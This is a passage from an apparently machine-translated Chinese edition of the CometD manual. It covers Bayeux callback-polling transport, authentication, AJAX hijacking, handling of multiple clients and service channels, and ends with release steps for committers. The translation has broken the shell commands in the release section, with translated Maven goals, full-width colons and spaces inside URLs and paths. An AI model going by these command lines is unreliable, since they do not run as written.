在发出另一个长轮询请求之前，客户端应该等待的毫秒数
回调轮询传输
回调轮询请求消息

消息应该作为url编码的HTTP GET请求的消息参数发送到服务器。

####回调轮询响应消息

响应发送包装在一个JavaScript回调，以促进交付。按照JSONP伪协议的规定，要触发的回调名称通过jsonp HTTP GET参数传递给服务器。在没有这样的参数的情况下，回调的名称默认为jsonpcallback。被调用的函数将传递一个JSON编码的Bayeux消息数组。

回调轮询响应消息可以包含建议字段，该字段包含特定于传输的字段以指示传输的操作模式。对于回调轮询传输，通知字段可以包含以下字段：

时间到
服务器将持有长轮询请求的毫秒数

间隔
在发出另一个长轮询请求之前，客户端应该等待的毫秒数


 安全 
-----
####认证
Bayeux协议可以用于：

- 没有认证

- 容器提供的认证（例如BASIC认证或基于cookie管理的会话认证）

- Bayeux扩展认证，在Bayeux消息ext字段内交换认证凭证和令牌

对于Bayeux认证，未指定算法来生成或验证安全凭证或令牌。该版本的协议仅定义了ext字段可用于交换身份验证质询，凭证和令牌，并且通知字段可用于控制交换的多次迭代。

连接协商机制可用于协商认证或请求重新认证。

####AJAX劫持

AJAX劫持漏洞是攻击性网站使用脚本标记执行从AJAX服务器获取的JSON编码内容。当cookie不用于身份验证时，Bayeux协议不容易受到这种攻击风格的影响，并且在返回私有客户端数据之前需要有效的客户端ID。某些传输使用POST进一步防止了这种攻击风格。

####多个客户端操作

目前的HTTP客户端实现被推荐为仅允许客户端和服务器之间的2个连接。当Bayeux客户端的多个实例在同一个浏览器实例的多个选项卡或窗口中操作时，会出现问题。可以通过来自每个标签或窗口的优秀连接元消息来消耗2连接限制，从而防止其他消息及时传递。

####服务器端多个客户端检测

建议Bayeux服务器实现使用cookie“BAYEUX_BROWSER”来标识HTTP客户端，从而检测在同一个HTTP客户端中运行的多个Bayeux客户端。一旦检测到，服务器不应该等待连接中的消息，并且应该使用建议间隔机制来建立传统的轮询。

####客户端多个客户端处理

建议Bayeux客户端实现使用客户端持久性或Cookie来检测在同一个HTTP客户端中运行的多个Bayeux客户端实例。一旦检测到，用户可以选择断开除一个客户端以外的其他所有客户端的连接。客户端实现可以使用客户端持久化来共享Bayeux客户端实例。

####通过服务渠道进行请求/响应操作

Bayeux协议直接支持的发布/订阅范例很难用于高效地实现客户端和服务器之间的请求/响应范例。 / service / **频道空间已被指定为特殊频道空间，以便通过Bayeux频道有效传输应用程序请求和响应。发布到服务频道的消息不会分发到其他Bayeux客户端，因此这些频道可用于Bayeux客户端和Bayeux服务器之间的私人请求。

一个简单的例子就是echo服务，它将从客户端收到的任何消息发送回该客户端，而不会改变。 Bayeux客户端将订阅/ service / echo频道，但Bayeux服务器不需要记录此订阅。当客户端向/ service / echo通道发布消息时，它将仅传递给服务器端订户（以实现相关的方式）。 echo服务的服务器端用户将通过直接向客户端发布响应来处理每个收到的消息，而不管任何订阅。由于客户端已订阅/ service / echo，响应消息将在客户端内正确路由到相应的订阅处理程序。

 附录D：提交者发布说明 
======================

这些说明仅适用于想要执行CometD版本的CometD提交者。

创建发布
--------

	$ git clone git：//github.com/cometd/cometd.git release / cometd
	...
	$ cd release / cometd
	$ mvn干净安装
	...
	$ mvn release：prepare＃指定标签只是版本号
	...
	$ mvn发布：执行-Darguments = -Dgpg.passphrase = ...
	...
	$ git push origin master

当Maven Release Plugin运行时，它会激活发布配置文件，运行执行其他操作的pom.xml文件的各个部分，例如构建分发tarball。

作为最后一步，Maven Release Plugin将运行交互式Linux shell脚本，该脚本执行许多自动步骤，例如上传分发tarball，创建和上传JavaDocs，将文件复制到依赖的GitHub存储库，发布到NPM等。

在完成发布过程需要完成的手动步骤之下。

管理存储库
---------
登录到Sonatype OSS。

点击“Staging Repositories”，你应该看到刚刚上传的mvn release：perform命令的阶段性项目，状态为“open”。勾选对应于打开阶段项目的复选框，从工具栏中选择“关闭”，输入描述如“CometD Release 1.0.0”，然后单击“关闭”按钮。这将使得阶段性项目可下载用于测试，但尚未发布到中央。

再次勾选与已关闭的阶段性项目对应的复选框，从工具栏中选择“释放”，输入描述如“CometD Release 1.0.0”，然后单击“释放”按钮。这会将项目发布到Maven Central Repository。

上传原型目录
------------
确保原型目录$ HOME / .m2 / archetype-catalog.xml引用刚刚准备好的发行版，然后将其上载。

$ dd if = $ HOME / .m2 / archetype-catalog.xml | ssh <user> @ cometd.org“sudo -u www-data dd of = / var / www / cometd.org / archetype-catalog.xml”
